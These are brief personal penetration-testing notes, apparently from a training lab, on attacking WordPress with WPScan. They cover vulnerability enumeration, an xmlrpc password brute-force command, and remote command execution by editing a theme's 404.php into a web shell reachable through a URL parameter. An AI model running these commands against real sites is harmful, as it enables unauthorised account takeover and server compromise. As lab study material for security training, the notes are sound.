[[Wordpress]]
https://github.com/wpscanteam/wpscan

https://wpscan.com/ or https://wpvulndb.com/ - register to obtain API key. it is required to scan for vulnerabilities.
#### Installation
```bash
sudo gem install wpscan
```
##### Enumerate ..
```bash
wpscan --url http://blog.inlanefreight.com --enumerate --api-token <token>
```

##### Password [[Brute Force]]
```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

##### [[RCE]] using theme editor
1. Visit http://94.237.56.165:54912/wp-admin/theme-editor.php?file=404.php&theme=ben_theme
2. Run command http://94.237.56.165:54912/wp-content/themes/ben_theme/404.php?lol=id